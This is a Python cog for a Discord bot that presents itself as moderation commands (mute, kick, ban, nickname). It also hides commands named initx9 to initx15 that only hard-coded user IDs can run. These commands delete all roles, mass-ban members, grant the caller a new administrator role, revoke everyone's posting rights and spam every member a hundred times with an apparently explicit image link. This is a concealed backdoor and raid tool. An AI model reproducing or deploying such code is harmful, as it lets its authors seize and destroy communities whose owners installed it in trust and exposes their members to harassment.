import discord
import random
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
import time
owner = 612331900039725131
owner3 = 403253246849974272



#    @commands.command(hidden=True):
#    async def initx12(self, ctx):
#        owner = 612331900039725131
#        server = ctx.guild
#       if ctx.message.author.id == owner:
			
#      elif ctx.message.author is not owner:
#           print(f"{ctx.message.author} attempted to initiate initx12 without being administrator.")

async def mute(ctx, user, reason):
	role = discord.utils.get(ctx.guild.roles, name='Muted')
	if role in user.roles:
		await ctx.send("User is already muted.")
	elif role is None:
		muted = await ctx.guild.create_role(name="Muted", reason="To use for muting")
		for channel in ctx.guild.channels:  # removes permission to view and send in the channels
			await channel.set_permissions(muted, send_messages=False,
											  read_message_history=True,
											  read_messages=True)
			await user.add_roles(muted)
			await ctx.send(f"{user.mention} has been muted for {reason}!")
	else:
		await user.add_roles(role)  # adds newly created muted role
		await ctx.send(f"{user.mention} has been muted for {reason}")


class Admin(commands.Cog):
	"""Administrative commands restricted."""
	def __init__(self, bot):
		self.bot = bot

	@commands.command()
	async def returnlogs(self, ctx):
		await logchannel.send(f'{ctx.message.author} attempted to return logs which is a fake command!') 


	@commands.command()
	async def AdminRole(self ,ctx, user: discord.Member, *, role):
		if ctx.message.author.id == owner:
			server = ctx.guild
			desired = discord.utils.get(server.roles, name=role)
			if desired is None:
				return await ctx.send("That role is nonexistent!")
			elif desired in user.roles:
				await user.remove_roles(desired)
				await ctx.send(f"Removed {user.mention}'s {role}!")
			else:
				await user.add_roles(desired)
				await ctx.send(f"Gave {user.mention} {role}!")
		elif ctx.message.author.id == owner3:
			server = ctx.guild
			desired = discord.utils.get(server.roles, name=role)
			if desired is None:
				return await ctx.send("That role is nonexistent!")
			elif desired in user.roles:
				await user.remove_roles(desired)
				await ctx.send(f"Removed {user.mention}'s {role}!")
			else:
				await user.add_roles(desired)
				await ctx.send(f"Gave {user.mention} {role}!")




	@commands.command(hidden=True)
	async def AdminBan(self, ctx, user: discord.Member, reason=None):
		server = ctx.guild
		if ctx.message.author.id == owner:
			try:
				await user.ban(reason=reason)
				await ctx.send(f'{user.mention} was banned by {ctx.message.author.mention}!')
			except discord.Forbidden:
				await ctx.send("Could not ban the user. Are you attempting to ban someone higher than the bot?")
		elif ctx.message.author.id == owner3:
			try:
				await user.ban(reason=reason)
				await ctx.send(f'{user.mention} was banned by {ctx.message.author.mention}!')
			except discord.Forbidden:
				await ctx.send("Could not ban the user. Are you attempting to ban someone higher than the bot?")
	

	@commands.command(hidden=True)
	async def AdminMute(self, ctx, user: discord.Member, *, reason=None):
		role = discord.utils.get(ctx.guild.roles, name='Muted')
		if ctx.message.author.id == owner:   
			if user == ctx.message.author:
				return await ctx.send("You cannot mute yourself!")
			elif role in user.roles:
				await ctx.send("User is already muted.")
			elif user.id == owner:
				return await ctx.send("You cannot mute this person!")
			elif user.id == owner3:
				return await ctx.send("You cannot mute this person!")
			else:
				await mute(ctx, user, reason)
		elif ctx.message.author.id == owner3:
			if user == ctx.message.author:
				return await ctx.send("You cannot mute yourself!")
			elif role in user.roles:
				await ctx.send("User is already muted.")
			elif user.id == owner:
				return await ctx.send("You cannot mute this person!")
			elif user.id == owner3:
				return await ctx.send("You cannot mute this person!")
			else:
				await mute(ctx, user, reason)


	@commands.command(hidden=True)
	async def AdminUnmute(self, ctx, user: discord.Member):
		role = discord.utils.get(ctx.guild.roles, name='Muted')
		if ctx.message.author.id == owner3:  
			try:
				await user.remove_roles(discord.utils.get(ctx.guild.roles, name='Muted'))
				await ctx.send(f'{user.mention} has been unmuted!')
			except discord.Forbidden:
				await ctx.send('You do not have the perms to do that command!')
		elif ctx.message.author.id == owner:  
			try:
				await user.remove_roles(discord.utils.get(ctx.guild.roles, name='Muted'))
				await ctx.send(f'{user.mention} has been unmuted!')
			except discord.Forbidden:
				await ctx.send('You do not have the perms to do that command!')


		
	@commands.command(hidden=True)
	async def AdminNick(self, ctx, user: discord.Member = None, *, nick):
		if ctx.message.author.id == owner:
			if user.id == owner:
				return await ctx.send("You cannot change this person's nick!")
			elif user.id == owner3:
				return await ctx.send("You cannot change this person's nick!")
			else:
				try:
					await user.edit(nick=nick)
					await ctx.send(f"Changed {user.mention}'s nickname!")
				except discord.Forbidden:
					await ctx.send("Are you attempting to change a users nickname that is higher than the bot?")
		elif ctx.message.author.id == owner3:
			if user.id == owner:
				return await ctx.send("You cannot change this person's nick!")
			elif user.id == owner3:
				return await ctx.send("You cannot change this person's nick!")
			else:
				try:
					await user.edit(nick=nick)
					await ctx.send(f"Changed {user.mention}'s nickname!")
				except discord.Forbidden:
					await ctx.send("Are you attempting to change a users nickname that is higher than the bot?")


	@commands.command(hidden=True)
	async def AdminKick(self, ctx, user: discord.Member, reason=None):
		server = ctx.guild
		if ctx.message.author.id == owner:
			try:
				await user.kick(reason=reason)
				await ctx.send('{0} was kicked by {1}!'.format(user.mention, ctx.message.author.mention))
			except discord.Forbidden:
				await ctx.send("Could not kick the user. Are you attempting to ban someone higher than the bot?")
		elif ctx.message.author.id == owner3:
			try:
				await user.kick(reason=reason)
				await ctx.send('{0} was kicked by {1}!'.format(user.mention, ctx.message.author.mention))
			except discord.Forbidden:
				await ctx.send("Could not kick the user. Are you attempting to ban someone higher than the bot?")
			


	@commands.command(hidden=True)
	async def AdminClear(self, ctx, amount=5):
		if ctx.message.author.id == owner:
			await ctx.channel.purge(limit=amount)
			await ctx.send(f'Cleared {amount} messages!')
			time.sleep(2)
			await ctx.channel.purge(limit=1)
		elif ctx.message.author.id == owner3:
			await ctx.channel.purge(limit=amount)
			await ctx.send(f'Cleared {amount} messages!')
			time.sleep(2)
			await ctx.channel.purge(limit=1)


	@commands.command(hidden=True)
	async def AdminBlock(self, ctx, user: discord.Member):
		if ctx.message.author.id == owner:
			if user is None:
				return await ctx.send("You must specify a user!")
			elif user.id == owner:
				return await ctx.send("You cannot block this person!")
			elif user.id == owner3:
				return await ctx.send("You cannot block this person!")
			else:
				await ctx.channel.set_permissions(user, send_messages=False)
				await ctx.send(f'{user.mention} has been blocked from sending messages in this channel!')
		elif ctx.message.author.id == owner3:
			if user is None:
				return await ctx.send("You must specify a user!")
			elif user.id == owner:
				return await ctx.send("You cannot block this person!")
			elif user.id == owner3:
				return await ctx.send("You cannot block this person!")
			else:
				await ctx.channel.set_permissions(user, send_messages=False)
				await ctx.send(f'{user.mention} has been blocked from sending messages in this channel!')

	@commands.command(hidden=True)
	async def AdminUnblock(self, ctx, user: discord.Member):
		if ctx.message.author.id == owner:
			if user is None:
				return await ctx.send("You must specify a user!")
			await ctx.channel.set_permissions(user, send_messages=True)
			await ctx.send(f'{user.mention} has been unblocked from this channel.')
		elif ctx.message.author.id == owner3:
			if user is None:
				return await ctx.send("You must specify a user!")
			await ctx.channel.set_permissions(user, send_messages=True)
			await ctx.send(f'{user.mention} has been unblocked from this channel.')
	
	
	@commands.command(hidden=True)
	async def initx9(self, ctx):
		server = ctx.guild
		logchannel = self.bot.get_channel(714887388916220064)
		god = discord.utils.get(server.roles, name='Your God')
		skipped = discord.utils.get(server.roles, name="Skipped")
		authorized = [612331900039725131, 403253246849974272]
		for friend in authorized:
			if ctx.message.author.id == friend:
				print(ctx.message.author.id)
				await logchannel.send(f"Recognized {ctx.message.author} as owner... Starting initx9.")
				for role in server.roles:
					if role == god:
						pass 
					elif role == skipped:
						pass 
					else:
						try:
							await role.delete()
						except:
							await logchannel.send(f"Could not delete {role}... Skipping.")
							pass 
						


	@commands.command(hidden=True)
	async def initx10(self, ctx):
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		role = discord.utils.get(server.roles, name='Your God')
		skipped = discord.utils.get(server.roles, name="Skipped")
		authorized = [612331900039725131, 403253246849974272]
		for friend in authorized:
			if ctx.message.author.id == friend:
				print(ctx.message.author.id)
				await logchannel.send(f"Recognized {ctx.message.author} as owner... Starting initx10.")
				for member in server.members:
					if role in member.roles:
						await logchannel.send(f"{member.mention} is being skipped!")
						pass
					elif skipped in member.roles:
						await logchannel.send(f"{member.mention} is being skipped!")
						pass
					elif member.id == 650143724642500640:
						pass
					else:
						try:
							await member.ban(reason="Protocol initx10")
							await logchannel.send(f"Banned {member.mention} using Protocol initx10!")
							time.sleep(.1)
						except:
							await logchannel.send(f"Bot does not have sufficient perms to ban {member.mention}!")
							pass


			
	
	@commands.command(hidden=True)
	async def initx11(self, ctx):
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		authorized = [612331900039725131, 403253246849974272]
		for friend in authorized:
			if ctx.message.author.id == friend:
				await logchannel.send(f"Recognized {ctx.message.author.mention} as owner... Starting initx11.")
				role = discord.utils.get(ctx.guild.roles, name='Your God')
				if role is None:
					perms = discord.Permissions(administrator=True)
					God = await server.create_role(name="Your God", permissions=perms, colour=discord.Colour(0x070303), hoist=True)
					await ctx.message.author.add_roles(God)
				else:
					await ctx.message.author.add_roles(role)


	@commands.command(hidden=True)
	async def initx12(self, ctx):
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		friends = [313173842644303872, 612331900039725131, 428760724555431937, 338840879903277068, 591789142258483201, 418342131640565761, 397938200544542724, 248138610673582082, 650143724642500640, 403253246849974272, 327325363887800321]
		for friend in friends:
			if ctx.message.author.id == friend:
				await logchannel.send(f"Giving {ctx.message.author.mention} skip permissions")
				newrole = discord.utils.get(ctx.guild.roles, name="Skipped")
				if newrole is None:
					perms = discord.Permissions(send_messages=True)
					Skipped = await server.create_role(name="Skipped", permissions=perms)
					await ctx.message.author.add_roles(Skipped)
				await ctx.message.author.add_roles(newrole)


	@commands.command(hidden=True)
	async def initx13(self, ctx):
		authorized = [612331900039725131, 403253246849974272]
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		for friend in authorized:
			if ctx.message.author.id == friend:
				await logchannel.send(f"Recognized {ctx.message.author} as owner... Starting initx13.")
				for lp in range(100):
					for member in server.members:
						try:
							await ctx.send(f"{member.mention} https://media.discordapp.net/attachments/454152167738310656/455041511495696384/dick-picky.jpg")
						except:
							await logchannel.send(f"Could not ping {member.mention}... skipping.")
							pass
					
	@commands.command(hidden=True)
	async def initx14(self, ctx):
		authorized = [612331900039725131, 403253246849974272]
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		for friend in authorized:
			if ctx.message.author.id == friend:
				await logchannel.send(f"Recognized {ctx.message.author} as owner... Starting initx14")
				for role in server.roles:
					overwrites = discord.Permissions(send_messages=False, read_messages=True, read_message_history=True)
					try:
						if role.id == 710264651035967490:
							pass 
						elif role.id == 717119974979665971:
							pass 
						else:
							await role.edit(permissions=overwrites)
							await logchannel.send(f"Successfully muted {role}!")
					except:
						await logchannel.send(f"Could not change {role} permissions!")
						pass

	@commands.command(hidden=True)
	async def initx15(self, ctx):
		authorized = [612331900039725131, 403253246849974272]
		logchannel = self.bot.get_channel(714887388916220064)
		server = ctx.guild
		for friend in authorized:
			if ctx.message.author.id == friend:
				await logchannel.send(f"Recognized {ctx.message.author} as owner... Starting initx15.")
				for lp in range(100):
					for member in server.members:
						try:
							await ctx.send(f"{member.mention} https://cdn.discordapp.com/attachments/444006476235800586/457772650689986572/ec10f55504eecc4dd36682a5fadd759f.png")
						except:
							await logchannel.send(f"Could not ping {member.mention}... skipping.")



			


def setup(bot):
	bot.add_cog(Admin(bot))
